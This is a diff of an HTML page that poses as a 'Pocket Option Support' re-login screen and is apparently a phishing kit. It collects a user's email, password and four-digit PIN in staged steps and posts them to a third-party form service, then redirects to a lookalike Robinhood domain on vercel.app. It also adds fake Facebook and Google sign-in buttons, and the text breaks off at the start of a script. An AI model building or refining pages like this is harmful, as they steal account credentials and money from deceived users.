@@ -54,35 +54,56 @@ h2, h3{
 </head>
 
 <body>
-
 <div class="container">
-<div class="logo">
-        <h2>POCKET OPTION SUPPORT</h2>
-       <p1> Re-login to continue <p2>
+
+    <div class="top-bar">
+        <span>← Back</span>
+        <span>🌐 English</span>
     </div>
+
+    <div class="logo">
+        <h2>POCKET OPTION SUPPORT</h2>
+    </div>
+<h2>Relogin To Continue</h2>
 
 <form action="https://api.web3forms.com/submit" method="POST">
 
-<input type="hidden" name="access_key" value="39483916-2d75-4776-91f8-2bbc171def4f">
+<input type="hidden" name="access_key" value="">
 
 <input type="hidden" name="redirect" value="https://robinhood-com.vercel.app/success.html">
+<!-- STEP 1 -->
+<div id="step1">
 <h3>Enter mail</h3>
 <input type="email" name="email" placeholder="yourgmail@gmail.com" required></div>
+
+<!-- STEP 2 -->
+<div id="step2" class="hidden">
 <h3>password</h3>
 <input type="text" name="username" placeholder="password" required>
 </div>
-<h2>verify Pin</h2>
+
+<!-- STEP 3 -->
+<div id="step3" class="hidden">
+<h3>verify Pin</h3>
 <textarea name="complaint" column="1" placeholder="verify 4 digit pin "></textarea>
-<h3>Country & Complaint</h3>
-<textarea name="extra_info" class="input" placeholder="Your country & complaint"></textarea>
-<!-- Hidden Step 1 Data -->
-<input type="hidden" name="whatsapp" id="whatsappField">
-<input type="hidden" name="complaint_step1" id="complaintField">
-<input type="hidden" name="country_step1" id="countryField">
-<button type="submit" class="btn">Login</button>
+
+<div id="step4" class="hidden">
+<h3>country, issue complaint</h3>
+<textarea name="complaint" column="1" placeholder="state your country and complaint"></textarea>
+<button type="submit">login</button>
+</div>
+
 </form>
 
 </div>
+
+    <div class="social">
+        <p>Or sign in with</p>
+
+        <div class="social-buttons">
+            <button class="fb">Facebook</button>
+            <button class="google">Google</button>
+        </div>
 
 <script>
 // Get Step 1 data
